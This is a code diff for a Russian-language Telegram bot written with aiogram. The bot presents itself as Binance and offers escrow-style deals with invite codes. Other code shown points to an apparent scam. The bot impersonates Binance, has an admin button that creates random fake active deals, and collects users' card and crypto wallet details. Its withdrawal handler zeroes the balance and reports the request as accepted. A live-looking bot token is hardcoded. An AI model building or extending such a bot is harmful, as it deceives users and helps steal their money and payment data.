@@ -4,6 +4,7 @@ import os
 import sys
 import signal
 import random
+import string
 from aiohttp import web
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
@@ -13,7 +14,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.client.default import DefaultBotProperties
 
-# Настройки
+# ===== НАСТРОЙКИ =====
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8916641100:AAGTlz5A0Xr3ShfmG197dMN6Kp359c-NMxc")
 MASTER_ID = int(os.getenv("MASTER_ID", "8297446667"))
 BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/GQf936XW/IMG-0389.jpg")
@@ -43,6 +44,7 @@ SHIELD_FALLBACK = "🛡"
 users = {}
 deals = {}
 deal_counter = 1000
+invite_codes = {}  # код -> deal_id
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
@@ -53,13 +55,14 @@ def is_premium_user(uid):
     return users.get(uid, {}).get("is_premium", False)
 
 def emoji(name, uid=None):
-    """Возвращает HTML-тег премиум-эмодзи или обычный символ в зависимости от Premium у пользователя."""
     e = EMOJI.get(name, ("", "❓"))
     if uid and is_premium_user(uid):
         return f"<tg-emoji emoji-id='{e[0]}'>{e[1]}</tg-emoji>"
     return e[1]
 
-# Тексты, которые зависят от пользователя, теперь требуют uid
+def SHIELD_EMOJI(uid):
+    return f"<tg-emoji emoji-id='{SHIELD_ID}'>{SHIELD_FALLBACK}</tg-emoji>" if is_premium_user(uid) else SHIELD_FALLBACK
+
 def welcome_text(uid):
     return (
         f"{emoji('briefcase', uid)} Добро пожаловать в Binance 🤝\n\n"
@@ -70,9 +73,6 @@ def welcome_text(uid):
         f"4⃣ {emoji('package', uid)} Передача товаров через менеджера</blockquote>\n\n"
         f"{emoji('lamp', uid)} Наш канал ─ @binance_announcements"
     )
-
-def SHIELD_EMOJI(uid):
-    return f"<tg-emoji emoji-id='{SHIELD_ID}'>{SHIELD_FALLBACK}</tg-emoji>" if is_premium_user(uid) else SHIELD_FALLBACK
 
 ADMIN_TEXT = "👑 Админ-панель\n\nВыберите действие:"
 
@@ -88,7 +88,11 @@ class AdminStates(StatesGroup):
 def get_lang(uid):
     return users.get(uid, {}).get("lang", "ru")
 
-# Клавиатуры теперь принимают uid для динамических эмодзи
+# Генерация короткого кода
+def generate_invite_code():
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+
+# ===== КЛАВИАТУРЫ =====
 def main_menu(lang="ru", uid=None):
     t = {
         "ru": [f"{emoji('balance_icon', uid)} Баланс", "📋 Мои сделки", "🤝 Создать сделку",
@@ -166,7 +170,7 @@ def back_button(lang="ru"):
         [InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")]
     ])
 
-# Утилиты отправки
+# ===== УТИЛИТЫ ОТПРАВКИ =====
 async def _delete_message(chat_id, msg_id):
     try: await bot.delete_message(chat_id, msg_id)
     except: pass
@@ -264,14 +268,51 @@ async def complete_deal_logic(deal_id, msg=None, call=None):
         await bot.send_message(buyer_id, f"✅ Сделка #{deal_id} завершена. С вашего баланса списано {amt} {emoji('ruble', buyer_id)}.")
     except: pass
 
-# Обновление статуса Premium при любом взаимодействии
 def update_premium(user: types.User):
     uid = user.id
     if uid not in users:
         users[uid] = {}
     users[uid]["is_premium"] = getattr(user, "is_premium", False)
 
-# /start
+# ===== ОБРАБОТЧИК КОДА СДЕЛКИ =====
+async def join_deal_by_code(message: Message, code: str):
+    uid = message.from_user.id
+    deal_id = invite_codes.get(code)
+    if not deal_id or deal_id not in deals:
+        return await message.answer("❌ Сделка не найдена или код недействителен.")
+    deal = deals[deal_id]
+    if deal["status"] != "active":
+        return await message.answer("❌ Эта сделка уже не активна.")
+    # Присоединение
+    if deal["seller_id"] is None and deal["buyer_id"] != uid:
+        deal["seller_id"] = uid
+    elif deal["buyer_id"] is None and deal["seller_id"] != uid:
+        deal["buyer_id"] = uid
+    else:
+        return await message.answer("❌ Вы уже участвуете или сделка заполнена.")
+    if deal["seller_id"] is not None and deal["buyer_id"] is not None:
+        deal["status"] = "active"
+    other_id = deal["seller_id"] if deal["seller_id"] != uid else deal["buyer_id"]
+    if other_id:
+        try:
+            await bot.send_message(other_id,
+                f"ℹ️ Вторая сторона присоединилась к сделке #{deal_id}.\n"
+                f"Продавец: {username_or_id(deal['seller_id'])}\n"
+                f"Покупатель: {username_or_id(deal['buyer_id'])}\n"
+                f"Статус: {deal_status_text(deal)}\n"
+                f"Сумма: {deal['amount']} {deal['currency']}"
+            )
+        except: pass
+    await message.answer(
+        f"✅ Вы присоединились к сделке #{deal_id}!\n\n"
+        f"Продавец: {username_or_id(deal['seller_id'])}\n"
+        f"Покупатель: {username_or_id(deal['buyer_id'])}\n"
+        f"Статус: {deal_status_text(deal)}\n"
+        f"Сумма: {deal['amount']} {deal['currency']}",
+        reply_markup=main_menu(get_lang(uid), uid)
+    )
+
+# ===== ХЕНДЛЕРЫ =====
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
     uid = message.from_user.id
@@ -279,71 +320,24 @@ async def cmd_start(message: Message):
     args = message.text.split()
     ref_id = None
 
-    if len(args) > 1 and args[1].startswith("deal_"):
-        try:
-            deal_id = int(args[1].split("_")[1])
-            if deal_id in deals and deals[deal_id]["status"] == "active":
-                d = deals[deal_id]
-                if d["seller_id"] is None and d["buyer_id"] != uid:
-                    d["seller_id"] = uid
-                elif d["buyer_id"] is None and d["seller_id"] != uid:
-                    d["buyer_id"] = uid
-                else:
-                    return await message.answer("❌ Вы уже участвуете или сделка заполнена.")
-                if d["seller_id"] is not None and d["buyer_id"] is not None:
-                    d["status"] = "active"
-                other_id = d["seller_id"] if d["seller_id"] != uid else d["buyer_id"]
-                if other_id:
-                    try:
-                        await bot.send_message(other_id,
-                            f"ℹ️ Вторая сторона присоединилась к сделке #{deal_id}.\n"
-                            f"Продавец: {username_or_id(d['seller_id'])}\n"
-                            f"Покупатель: {username_or_id(d['buyer_id'])}\n"
-                            f"Статус: {deal_status_text(d)}\n"
-                            f"Сумма: {d['amount']} {d['currency']}"
-                        )
-                    except: pass
-                return await message.answer(
-                    f"✅ Вы присоединились к сделке #{deal_id}!\n\n"
-                    f"Продавец: {username_or_id(d['seller_id'])}\n"
-                    f"Покупатель: {username_or_id(d['buyer_id'])}\n"
-                    f"Статус: {deal_status_text(d)}\n"
-                    f"Сумма: {d['amount']} {d['currency']}",
-                    reply_markup=main_menu(get_lang(uid), uid)
-                )
-        except: pass
-
-    if len(args) > 1:
-        try: ref_id = int(args[1])
-        except: pass
+    if len(args) > 1 and args[1].startswith("join_"):
+        code = args[1][5:]
+        return await join_deal_by_code(message, code)
 
     if uid not in users:
         users[uid] = {
             "balance": 0.0, "ton": "", "card": "", "username": "", "stars": "", "usdt": "", "btc": "",
-            "lang": "ru", "history": [], "pending_rekv": None, "referrer_id": ref_id, "referrals": [],
-            "last_menu_msg_id": None, "completed_deals": 0, "ref_earned_ton": 0.0, "is_premium": False
+            "lang": "ru", "history": [], "pending_rekv": None, "referrer_id": None, "referrals": [],
+            "last_menu_msg_id": None, "completed_deals": 0, "ref_earned_ton": 0.0,
+            "is_premium": getattr(message.from_user, "is_premium", False)
         }
-    else:
-        users[uid].update({
-            "balance": users[uid].get("balance", 0.0),
-            "ton": users[uid].get("ton", ""),
-            "card": users[uid].get("card", ""),
-            "username": users[uid].get("username", ""),
-            "stars": users[uid].get("stars", ""),
-            "usdt": users[uid].get("usdt", ""),
-            "btc": users[uid].get("btc", ""),
-            "lang": users[uid].get("lang", "ru"),
-            "history": users[uid].get("history", []),
-            "pending_rekv": users[uid].get("pending_rekv"),
-            "referrer_id": ref_id,
-            "referrals": users[uid].get("referrals", []),
-            "last_menu_msg_id": users[uid].get("last_menu_msg_id"),
-            "completed_deals": users[uid].get("completed_deals", 0),
-            "ref_earned_ton": users[uid].get("ref_earned_ton", 0.0),
-            "is_premium": users[uid].get("is_premium", False)
-        })
 
+    # реферальная система
+    if len(args) > 1:
+        try: ref_id = int(args[1])
+        except: ref_id = None
     if ref_id and ref_id != uid and ref_id in users:
+        users[uid]["referrer_id"] = ref_id
         users[ref_id]["balance"] += 2.0
         users[ref_id].setdefault("history", []).append(f"🎁 Реферал: +2 {emoji('ruble', ref_id)} от {uid}")
         users[ref_id].setdefault("referrals", []).append(uid)
@@ -367,8 +361,22 @@ async def cmd_start(message: Message):
         except: pass
     if not new_msg:
         new_msg = await message.answer(caption, reply_markup=main_menu(get_lang(uid), uid), parse_mode="HTML")
-
     users[uid]["last_menu_msg_id"] = new_msg.message_id
+
+@dp.message(Command("join"))
+async def join_cmd(message: Message):
+    update_premium(message.from_user)
+    try:
+        code = message.text.split()[1]
+        await join_deal_by_code(message, code)
+    except:
+        await message.answer("❌ Используйте: /join <код>")
+
+@dp.message(F.text.regexp(r'#([a-z0-9]{8})'))
+async def join_by_hashtag(message: Message):
+    update_premium(message.from_user)
+    code = message.text.strip()[1:9]  # извлекаем код после #
+    await join_deal_by_code(message, code)
 
 # Админ-команды
 @dp.message(Command("admin"))
@@ -457,7 +465,7 @@ async def adm_all_deals(call: CallbackQuery):
     if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
     if not deals: return await delete_and_send_text(call, "📭 Сделок нет.", admin_menu(call.from_user.id))
     txt = "📋 Все сделки:\n\n" + "\n".join(
-        [f"#{did}: {d['amount']} {d['currency']} | Продавец: {username_or_id(d['seller_id'])} | Покупатель: {username_or_id(d['buyer_id'])} | Статус: {deal_status_text(d)}" for did,d in deals.items()]
+        [f"<b>#{did}</b>: {d['amount']} {d['currency']} | Продавец: {username_or_id(d['seller_id'])} | Покупатель: {username_or_id(d['buyer_id'])} | Статус: {deal_status_text(d)}" for did,d in deals.items()]
     )
     await delete_and_send_text(call, txt, admin_menu(call.from_user.id))
 
@@ -469,7 +477,7 @@ async def adm_stats(call: CallbackQuery):
     total_deals = len(deals)
     active_deals = sum(1 for d in deals.values() if d["status"] == "active")
     total_balance = sum(u.get("balance", 0) for u in users.values())
-    txt = f"📊 Статистика:\n\n👥 Пользователей: {total_users}\n📋 Сделок: {total_deals}\n🟢 Активных: {active_deals}\n💰 Общий баланс: {total_balance} {emoji('ruble', call.from_user.id)}"
+    txt = f"📊 Статистика:\n\n<b>Пользователей:</b> {total_users}\n<b>Сделок:</b> {total_deals}\n<b>Активных:</b> {active_deals}\n<b>Общий баланс:</b> {total_balance} {emoji('ruble', call.from_user.id)}"
     await delete_and_send_text(call, txt, admin_menu(call.from_user.id))
 
 @dp.callback_query(F.data == "admin_fake_deals")
@@ -481,12 +489,17 @@ async def adm_fake(call: CallbackQuery):
     cnt = random.randint(0, 40)
     for _ in range(cnt):
         deal_counter += 1
+        code = generate_invite_code()
+        while code in invite_codes:
+            code = generate_invite_code()
+        invite_codes[code] = deal_counter
         deals[deal_counter] = {
             "seller_id": random.choice(list(users.keys())) if users else MASTER_ID,
             "buyer_id": random.choice(list(users.keys())) if users else MASTER_ID,
             "amount": round(random.uniform(100, 10000), 2),
             "currency": random.choice(cur_list),
-            "status": "active"
+            "status": "active",
+            "invite_code": code
         }
     await delete_and_send_text(call, f"✅ Создано {cnt} тестовых сделок.", admin_menu(call.from_user.id))
 
@@ -500,11 +513,11 @@ async def balance_menu_handler(call: CallbackQuery):
     if bal == 0:
         balance_line = "💔 Ваш баланс пока пуст"
     else:
-        balance_line = f"{emoji('balance_icon', uid)} Ваш баланс: {bal:.2f} {emoji('ruble', uid)}"
+        balance_line = f"{emoji('balance_icon', uid)} Ваш баланс: <b>{bal:.2f}</b> {emoji('ruble', uid)}"
     txt = (
-        f"{emoji('balance_icon', uid)} Ваш баланс:\n\n"
+        f"{emoji('balance_icon', uid)} <b>Ваш баланс:</b>\n\n"
         f"{balance_line}\n\n"
-        f"📈 Завершённых сделок: {completed}"
+        f"📈 Завершённых сделок: <b>{completed}</b>"
     )
     await delete_and_send_banner(call, txt, balance_menu(lang, uid))
 
@@ -526,7 +539,7 @@ async def withdraw_funds_handler(call: CallbackQuery):
         return
     users[uid]["balance"] = 0.0
     users[uid].setdefault("history", []).append(f"💸 Вывод: -{b:.2f} {emoji('ruble', uid)}")
-    await delete_and_send_text(call, f"✅ Заявка на вывод {b:.2f} {emoji('ruble', uid)} принята.", back_button(lang))
+    await delete_and_send_text(call, f"✅ Заявка на вывод <b>{b:.2f}</b> {emoji('ruble', uid)} принята.", back_button(lang))
 
 # Реквизиты
 @dp.callback_query(F.data == "my_rekv")
@@ -614,24 +627,29 @@ async def amount_entered(message: Message, state: FSMContext):
     seller_id = uid if role == "seller" else None
     buyer_id = uid if role == "buyer" else None
 
+    # Генерация кода
+    code = generate_invite_code()
+    while code in invite_codes:
+        code = generate_invite_code()
+    invite_codes[code] = deal_counter
+
     deals[deal_counter] = {
         "seller_id": seller_id,
         "buyer_id": buyer_id,
         "amount": amt,
         "currency": currency,
-        "status": "active"
+        "status": "active",
+        "invite_code": code
     }
-
-    link = f"https://t.me/{(await bot.me()).username}?start=deal_{deal_counter}"
 
     text = (
         f"✅ Сделка #{deal_counter} создана!\n\n"
-        f"👤 Продавец: {username_or_id(seller_id)}\n"
-        f"👤 Покупатель: {username_or_id(buyer_id)}\n"
-        f"📌 Статус: {deal_status_text(deals[deal_counter])}\n"
-        f"💰 Сумма: {amt} {emoji('ruble', uid)} ({currency})\n\n"
-        f"🔗 Отправьте эту ссылку второй стороне для присоединения:\n{link}\n\n"
-        f"После входа обеих сторон менеджер завершит сделку."
+        f"Продавец: {username_or_id(seller_id)}\n"
+        f"Покупатель: {username_or_id(buyer_id)}\n"
+        f"Статус: {deal_status_text(deals[deal_counter])}\n"
+        f"Сумма: <b>{amt}</b> {emoji('ruble', uid)} ({currency})\n\n"
+        f"Код для присоединения: <code>#{code}</code>\n"
+        f"Отправьте этот код второй стороне, или она может использовать команду /join {code}"
     )
     await message.answer(text, reply_markup=main_menu(lang, uid))
     await state.clear()
@@ -645,12 +663,22 @@ async def my_deals_handler(call: CallbackQuery):
     if not user_deals:
         await delete_and_send_text(call, "🔍 У вас пока нет активных сделок.", back_button(lang))
         return
-    txt = "📋 Ваши сделки:\n\n" + "\n".join(
-        [f"🔹 #{did}: {d['amount']} {emoji('ruble', uid)} ({d['currency']}) | Статус: {deal_status_text(d)}" for did, d in user_deals]
-    )
-    txt += "\n\n🔎 Быстрый поиск: /search код_сделки"
+    lines = []
+    for did, d in user_deals:
+        seller = username_or_id(d["seller_id"])
+        buyer = username_or_id(d["buyer_id"])
+        lines.append(
+            f"<b>Сделка #{did}</b>\n"
+            f"👤 Продавец: {seller}\n"
+            f"👤 Покупатель: {buyer}\n"
+            f"💰 Сумма: {d['amount']} {emoji('ruble', uid)} ({d['currency']})\n"
+            f"📌 Статус: {deal_status_text(d)}\n"
+            f"🔗 Код: <code>#{d.get('invite_code', '—')}</code>"
+        )
+    txt = "📋 <b>Ваши сделки:</b>\n\n" + "\n\n".join(lines)
     await delete_and_send_text(call, txt, back_button(lang))
 
+# Поиск сделки по команде
 @dp.message(Command("search"))
 async def search_cmd(message: Message):
     update_premium(message.from_user)
@@ -683,14 +711,14 @@ async def referrals_handler(call: CallbackQuery):
     txt = (
         f"{emoji('people', uid)} Реферальная программа\n\n"
         f"<blockquote>🔗 Ваша ссылка:\n{link}\n\n"
-        f"{emoji('people', uid)} Рефералов: {len(refs)}\n"
-        f"{emoji('balance_icon', uid)} Заработано: {earned_ton} TON</blockquote>\n\n"
+        f"{emoji('people', uid)} Рефералов: <b>{len(refs)}</b>\n"
+        f"{emoji('balance_icon', uid)} Заработано: <b>{earned_ton}</b> TON</blockquote>\n\n"
         f"{emoji('coin', uid)} Бонус: 50% от комиссии с каждой сделки реферала!"
     ) if lang=="ru" else (
         f"{emoji('people', uid)} Referral Program\n\n"
         f"<blockquote>🔗 Your link:\n{link}\n\n"
-        f"{emoji('people', uid)} Referrals: {len(refs)}\n"
-        f"{emoji('balance_icon', uid)} Earned: {earned_ton} TON</blockquote>\n\n"
+        f"{emoji('people', uid)} Referrals: <b>{len(refs)}</b>\n"
+        f"{emoji('balance_icon', uid)} Earned: <b>{earned_ton}</b> TON</blockquote>\n\n"
         f"{emoji('coin', uid)} Bonus: 50% commission from each referral deal!"
     )
     await delete_and_send_banner(call, txt, back_button(lang))
@@ -705,7 +733,7 @@ async def lang_cb(call: CallbackQuery):
     users[uid]["lang"] = new_lang
     await return_to_main(call, new_lang)
 
-# Ввод реквизитов (общий)
+# Ввод реквизитов
 @dp.message()
 async def handle_rekv_input(message: Message):
     update_premium(message.from_user)
@@ -734,9 +762,16 @@ async def main():
     logging.info("Запуск бота и HTTP-сервера...")
     try: await bot.session.close()
     except: pass
+    await asyncio.sleep(1.5)
     await bot.delete_webhook(drop_pending_updates=True)
+    await asyncio.sleep(0.5)
     await run_web_server()
-    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types(), polling_timeout=20, handle_as_tasks=True)
+    await dp.start_polling(
+        bot,
+        allowed_updates=dp.resolve_used_update_types(),
+        polling_timeout=20,
+        handle_as_tasks=True
+    )
 
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, lambda s,f: sys.exit(0))
